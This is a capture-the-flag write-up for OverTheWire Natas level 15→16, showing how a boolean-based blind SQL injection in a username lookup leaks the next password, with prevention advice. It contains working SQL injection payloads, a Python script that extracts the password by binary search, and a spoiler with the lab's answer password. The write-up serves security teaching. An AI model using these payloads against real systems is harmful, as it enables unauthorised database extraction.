# Natas Level 15 → 16

## Objective

Retrieve the password for the next level by exploiting a Boolean-Based Blind SQL Injection vulnerability.

Unlike normal SQL Injection, the application does not directly reveal database output.  
The password must be extracted by analyzing TRUE/FALSE responses.

---

## Enumeration

- Reviewed the webpage functionality.
- Found a username lookup feature.
- The application reveals whether a username exists.
- Observed different responses depending on database query results.
- Identified a Boolean-Based Blind SQL Injection vulnerability.

---

## Initial Testing

The page contains a single input field:

```text
Username
```

Testing a valid username:

```text
natas16
```

Response:

```text
This user exists.
```

Testing a random username:

```text
randomuser
```

Response:

```text
This user doesn't exist.
```

---

## Observation

The application does not display database data.

However, it leaks information through two responses:

TRUE:

```text
This user exists.
```

FALSE:

```text
This user doesn't exist.
```

This behavior can be abused to extract hidden information one character at a time.

---

# Source Code Analysis

The application connects to the MySQL database:

```php
$link = mysqli_connect(
    'localhost',
    'natas15',
    '<censored>'
);
```

The SQL query checks if the username exists:

```php
$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
```

The result is checked:

```php
if(mysqli_num_rows(mysqli_query($link, $query)) > 0) {
    echo "This user exists.";
}
else {
    echo "This user doesn't exist.";
}
```

---

## Vulnerability

### Boolean-Based Blind SQL Injection

The original SQL query:

```sql
SELECT *
FROM users
WHERE username="<input>";
```

Because user input is directly inserted into the query, additional SQL conditions can be injected.

Example:

```sql
natas16" AND 1=1 #
```

Resulting query:

```sql
SELECT *
FROM users
WHERE username="natas16"
AND 1=1;
```

Since:

```sql
1=1
```

is TRUE:

```text
This user exists.
```

---

Testing FALSE condition:

Payload:

```sql
natas16" AND 1=2 #
```

Query:

```sql
SELECT *
FROM users
WHERE username="natas16"
AND 1=2;
```

Since:

```sql
1=2
```

is FALSE:

```text
This user doesn't exist.
```

SQL Injection confirmed.

---

# Password Length Enumeration

The password length can be checked using:

```sql
natas16" AND LENGTH(password)=32 #
```

The server responds:

```text
This user exists.
```

Therefore:

```text
Password length = 32 characters
```

---

# Character Extraction

Since the password cannot be displayed directly, each character must be guessed.

Example payload:

```sql
natas16" AND BINARY SUBSTRING(password,1,1)="a" #
```

Explanation:

```sql
SUBSTRING(password,1,1)
```

extracts:

```text
First character of password
```

The condition checks:

```text
Is first character equal to 'a'?
```

TRUE:

```text
This user exists.
```

FALSE:

```text
This user doesn't exist.
```

---

## Why BINARY is Required

MySQL comparisons are case-insensitive by default.

Example:

```text
a = A
```

To compare exact characters:

```sql
BINARY
```

is used.

Now:

```text
a ≠ A
```

---

# Automation

Manual testing would require hundreds of requests.

Python can automate the extraction process.

## Basic Logic

```python
for every password position:
    for every possible character:

        send SQL payload

        if response is TRUE:
            save character
```

---

# Optimized Approach - Binary Search

Instead of checking:

```text
a?
b?
c?
d?
...
```

ASCII values can be compared.

Example:

```sql
natas16"
AND ASCII(SUBSTRING(password,1,1))>79
#
```

The database answers:

```text
TRUE / FALSE
```

Each request removes half of the possible characters.

---

## Exploit Script

```python
import requests
from requests.auth import HTTPBasicAuth

url = "http://natas15.natas.labs.overthewire.org/index.php"

session = requests.Session()

session.auth = HTTPBasicAuth(
    "natas15",
    "<password>"
)

password = ""

for pos in range(1,33):

    low = 32
    high = 126

    while low <= high:

        mid = (low + high)//2

        payload = (
            f'natas16" AND '
            f'ASCII(SUBSTRING(password,{pos},1))>{mid} #'
        )

        response = session.post(
            url,
            data={"username":payload}
        )


        if "This user exists." in response.text:
            low = mid + 1

        else:
            high = mid - 1


    password += chr(low)

    print(password)


print("Password:", password)
```

---

# Binary Search Explanation

Initial range:

```text
ASCII 32 ---------------- ASCII 126
```

Middle value is selected:

```text
79
```

The database is asked:

```text
Is character > 79?
```

If TRUE:

Search:

```text
80 - 126
```

If FALSE:

Search:

```text
32 - 78
```

The range keeps reducing until only one character remains.

---

# Performance Comparison

## Normal Bruteforce

Characters:

```text
abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789
```

Requests:

```text
32 × 62

≈ 2000 HTTP requests
```

---

## Binary Search

Requests:

```text
32 × 7

≈ 220 HTTP requests
```

Much faster extraction.

---

# Attack Flow

```
Open Username Checker
          │
          ▼
Find TRUE/FALSE Responses
          │
          ▼
Inject SQL Conditions
          │
          ▼
Confirm Blind SQL Injection
          │
          ▼
Find Password Length
          │
          ▼
Extract Characters
          │
          ▼
Use Binary Search Optimization
          │
          ▼
Reconstruct Password
          │
          ▼
Access Next Level
```

---

# Result

The password was successfully extracted using Boolean-Based Blind SQL Injection.

The application never displayed the password directly, but database responses leaked enough information to reconstruct it.

---

# Prevention

- Use prepared statements.
- Avoid concatenating user input into SQL queries.
- Validate and sanitize input.
- Use least privilege database accounts.
- Avoid revealing different responses for database matches.
- Implement secure error handling.

Example:

```php
$stmt = $db->prepare(
    "SELECT * FROM users WHERE username=?"
);
```

---

# Key Takeaways

- Blind SQL Injection relies on inference.
- TRUE/FALSE responses can leak sensitive information.
- Database functions like LENGTH(), SUBSTRING(), and ASCII() can extract data.
- Automation is essential for Blind SQL Injection.
- Binary search greatly improves extraction speed.
- Parameterized queries prevent SQL Injection.

---

<details>
<summary><strong>🔑 Password (Spoiler)</strong></summary>

```text
Username : natas16
Password : Xm6XEeRN3zsGjRDqBPmuqAVV65k7e3Gb
```

</details>